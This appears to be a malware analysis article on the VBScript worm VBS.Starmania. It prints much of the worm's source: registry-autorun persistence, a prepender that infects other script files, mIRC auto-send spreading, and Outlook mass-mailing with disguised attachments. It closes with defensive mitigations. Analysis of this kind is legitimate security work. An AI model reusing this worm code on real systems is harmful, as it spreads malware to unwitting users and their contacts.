# Dissecting VBS.Starmania: A Prepender Worm with IRC and Email Spread 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.Starmania (dated May 9, 2001) is a Visual Basic Script (VBScript) worm built for Windows Script Host (WSH). It mixes multiple tactics that were common at the time: registry‑based persistence, VBScript file prepending (to infect other scripts), mIRC auto‑send propagation, randomized email lures via Outlook, and light “payload” modifications to system settings and login UI. The worm also changes web browser start pages randomly to high‑profile domains.

From a defender’s perspective, VBS.Starmania provides a concise example of how minimal VBScript can stitch together replication, lateral spread, and cosmetic tampering without exploits or packing. The script relies on default‑permissive automation and user trust: extensions hidden by default, DCC file transfers in IRC, and mass mailing through the Outlook object model. By tracing the code’s entry points and helpers, we can extract robust indicators and detection opportunities that remain useful today.

## Section 1 – Overview of the Malware 🐛
Starmania’s objectives are to persist, infect nearby VBScript files to grow its footprint, and propagate through social channels.

- Persistence: On execution, it copies itself into the Windows and System directories under innocuous names (Hwinfo.vbs and Issetup.vbs), then writes Run and RunServices entries under HKLM so both copies launch at startup.
- Local infection: It scans several folders (Windows, System, Temp, WSH Samples, Desktop, and the user’s “My Documents”) for .vbs and .vbe files. For each eligible file that is not already marked, it prepends its own source, turning that file into another worm instance.
- IRC propagation: If mIRC is present, the worm drops a script.ini that DCC‑sends an attached copy (the Windows copy) to users joining IRC channels.
- Email propagation: It iterates Outlook address books, sending one email per recipient with one of several randomized lures and an attached copy named to resemble a picture (“.jpg.vbs”), a tool (“LoveFix.vbs”), or a giveaway (“Win_A_Holiday.vbs”).
- Cosmetic/system changes: On the 15th day of the month, it writes a Winlogon legal notice, changes the RegisteredOwner/Organization, sets a mischievous Run value (“rundll32 mouse,disable”), and displays a message box. Separately, it randomizes the Internet Explorer start page to a small set of domains.

The worm targets consumer Windows setups of the time, where WSH was enabled and Outlook/IRC were common. It doesn’t use exploits—only automation and social engineering—so controls that constrain scripting and client automation significantly reduce its impact.

## Section 2 – Source Code Analysis 🔬
The script’s high‑level flow is `START()` followed by helper routines ptk (the prepender), Worm (mIRC), Mess (system/login changes), Raffle (IE start page), and Email (Outlook spam). Errors are broadly ignored with `On Error Resume Next` to keep running across missing software or access denials.

### Persistence: Dual Copies and Autoruns
```vb
Set win = f.GetSpecialFolder(0)
Set sys = f.GetSpecialFolder(1)
Set cop = f.GetFile(WScript.ScriptFullName)
cop.Copy win & "\Hwinfo.vbs"
cop.Copy sys & "\Issetup.vbs"
run  = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Hwinfo"
runs = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Issetup"
w.RegWrite run,  win & "\Hwinfo.vbs"
w.RegWrite runs, sys & "\Issetup.vbs"
```
- The worm copies itself to two system locations and writes corresponding Run and RunServices values under HKLM for persistence. Using both keys increases the chance of launch across variants of Windows 9x/ME/2000.

### Prepender Infection of VBScript Files
```vb
Function ptk(Folder)
  If f.FolderExists(Folder) Then
    For Each P In f.GetFolder(Folder).Files
      ext = f.GetExtensionName(P.Name)
      If ext = "vbs" Or ext = "vbe" Then
        Set VF = f.OpenTextFile(P.path, 1)
        mark = VF.Read(14): VF.Close
        If mark <> "'VBS.Starmania" Then
          Set VF = f.OpenTextFile(P.path, 1): VC = VF.ReadAll: VF.Close
          VCd = vbsworm & VC
          Set VF = f.OpenTextFile(P.path, 2, True)
          VF.Write VCd: VF.Close
        End If
      End If
    Next
  End If
End Function
```
- `vbsworm` holds the worm’s own source code (read at startup). For each .vbs/.vbe file, the worm reads the first 14 characters and checks for its signature comment (`'VBS.Starmania`). If absent, it prepends its code, turning that file into a new infection while preserving the original content underneath.
- The prepender runs against several folders:
  - Windows, System, Temp
  - Windows\Samples\Wsh and Windows\Desktop
  - The user’s “Personal” (My Documents) folder read from HKLM\...\Shell Folders\Personal

### IRC Propagation via mIRC
```vb
Function Worm(Path)
  If Path = "" Then
    prgfl = w.RegRead("HKLM\...\ProgramFilesDir")
    If f.FileExists("C:\mirc\mirc.ini") Then Path = "C:\mirc"
    If f.FileExists(prgfl & "\mirc\mirc.ini") Then Path = prgfl & "\mirc"
    If f.FileExists("C:\mirc32\mirc.ini") Then Path = "C:\mirc32"
    If f.FileExists(prgfl & "\mirc32\mirc.ini") Then Path = prgfl & "\mirc32"
  End If
  If Path <> "" Then
    Set mirc = f.CreateTextFile(Path & "\script.ini", True)
    mirc.WriteLine "[script]"
    mirc.WriteLine "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } "
    mirc.WriteLine "n1=  /dcc send $nick " & f.GetSpecialFolder(0) & "\Hwinfo.vbs"
    mirc.WriteLine "n2=}"
  End If
End Function
```
- The worm locates mIRC by default and Program Files paths, then writes an `ON 1:JOIN` handler that DCC‑sends `Hwinfo.vbs` (the Windows copy) to anyone joining the channel, propagating peer‑to‑peer.

### System and Login Modifications (“Mess”)
```vb
If Day(Now) = 15 Then
  w.RegWrite "HKLM\...\Run\StarMania", "rundll32 mouse,disable"
  w.RegWrite "HKLM\...\Winlogon\LegalNoticeText", "How are you today ? ..."
  w.RegWrite "HKLM\...\Winlogon\LegalNoticeCaption", "VBS.Starmania"
  w.RegWrite "HKLM\...\RegisteredOwner", "Starmania"
  w.RegWrite "HKLM\...\RegisteredOrganization", "PetiK Corpor@tion"
  MsgBox "Hi man, it's my new Worm/Virus...", vbinformation, "VBS.Starmania"
End If
```
- On the 15th day of any month, the worm sets a prank Run entry that would (attempt to) disable the mouse, shows a Winlogon legal notice and caption at next logon, and overwrites the RegisteredOwner/Organization fields—visible system metadata changes.

### Random IE Start Page (“Raffle”)
```vb
Randomize: lot = Int((5*Rnd)+1)
If lot = 1 Then w.RegWrite "HKCU\...\Start Page", "http://www.symantec.com"
ElseIf lot = 2 Then w.RegWrite "...", "http://www.pandasoftware.com"
ElseIf lot = 3 Then w.RegWrite "...", "http://www.avp.ch"
ElseIf lot = 4 Then w.RegWrite "...", "http://www.cia.gov"
ElseIf lot = 5 Then w.RegWrite "...", "http://www.fbi.gov"
```
- Each run randomly picks from five domains—three antivirus vendors and two government sites—to set as IE’s homepage.

### Randomized Email Lures
```vb
Set O = CreateObject("Outlook.Application")
Set mapi = O.GetNameSpace("MAPI")
For Each AL In mapi.AddressLists
  If AL.AddressEntries.Count <> 0 Then
    For AddListCount = 1 To AL.AddressEntries.Count
      Set ALE = AL.AddressEntries(AddListCount)
      Set go = O.CreateItem(0): go.To = ALE.Address
      Randomize: num = Int((3*Rnd)+1)
      Set c = f.GetFile(WScript.ScriptFullName)
      If num = 1 Then
        c.Copy f.GetSpecialFolder(0) & "\NewPic__Cool.jpg.vbs"
        go.Subject = "New Picture for you !"
        go.Body = "Look at this nice picture attached"
        go.Attachments.Add f.BuildPath(f.GetSpecialFolder(0), "NewPic__Cool.jpg.vbs")
      ElseIf num = 2 Then
        c.Copy f.GetSpecialFolder(0) & "\LoveFix.vbs"
        go.Subject = "LoveLetter Fix"
        go.Body = "Protect you against VBS.LoveLetter.Variant"
        go.Attachments.Add f.BuildPath(f.GetSpecialFolder(0), "LoveFix.vbs")
      ElseIf num = 3 Then
        c.Copy f.GetSpecialFolder(0) & "\Win_A_Holiday.vbs"
        go.Subject = "How to win a holiday in Paris"
        go.Body = "Play at this game attached and win a holiday in Paris"
        go.Attachments.Add f.BuildPath(f.GetSpecialFolder(0), "Win_A_Holiday.vbs")
      End If
      If go.To <> "" Then go.Send
    Next
  End If
Next
```
- For each contact, the worm sends an individualized email with one of three randomized lures and a copy of itself saved into the Windows directory with a matching filename. Dual extensions (e.g., `.jpg.vbs`) are chosen to appear benign when extensions are hidden.
- The code mixes object names (`fso` vs `f`) in a couple spots, a minor inconsistency typical of hand‑written scripts but not core to behavior.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Constrain Windows Script Host (WSH): Disable or restrict `wscript.exe`/`cscript.exe` for standard users with application control (AppLocker/WDAC). Where scripting is needed, isolate to signed scripts and trusted paths.
- Email gateway controls: Block .vbs/.vbe attachments; apply policies to flag dual‑extension names (e.g., `.jpg.vbs`) and subjects matching lure patterns. Detonate suspicious attachments and HTML in sandboxes.
- Outlook automation hardening: Enforce prompts or block programmatic access to the Outlook object model. Monitor for processes generating high volumes of `CreateItem(0)` events or rapid per‑recipient sends.
- mIRC monitoring and policy: If IRC is allowed, watch for creation or changes to `script.ini` and for DCC transfers initiated automatically. Consider disallowing DCC at the network perimeter.
- File infection detection: Scan .vbs/.vbe files for the Starmania signature (`'VBS.Starmania` at file start) and for prepended worm code. EDR telemetry can flag mass sequential writes to script files across Windows, System, Temp, and user folders.
- Registry telemetry and rollback: Alert on writes to HKLM Run/RunServices entries named `Hwinfo`/`Issetup`, on Winlogon LegalNotice keys, and on HKCU IE Start Page changes to unexpected domains. Maintain baseline and auto‑remediation for these keys.
- User awareness: Train users to treat unsolicited picture “.jpg.vbs” or “fix” scripts with suspicion, and to avoid enabling scripting in email clients.
- Least privilege: Running without administrative rights reduces the worm’s ability to write to HKLM and system directories, limiting persistence and infection scope.

## Conclusion
VBS.Starmania combines several well‑worn techniques into a compact natural‑language script: autorun persistence, a prepending infection mechanism for other VBScript files, mIRC DCC auto‑send, and randomized email lures. Its periodic system/login changes add visible noise that can help detection. Despite being two decades old, the behavioral pattern—scripting hosts automating clients and modifying the shell and registry—remains relevant. By focusing on scripting controls, client automation policies, registry/file telemetry, and attachment filtering, defenders can both detect and blunt the spread of Starmania‑style worms and their modern descendants.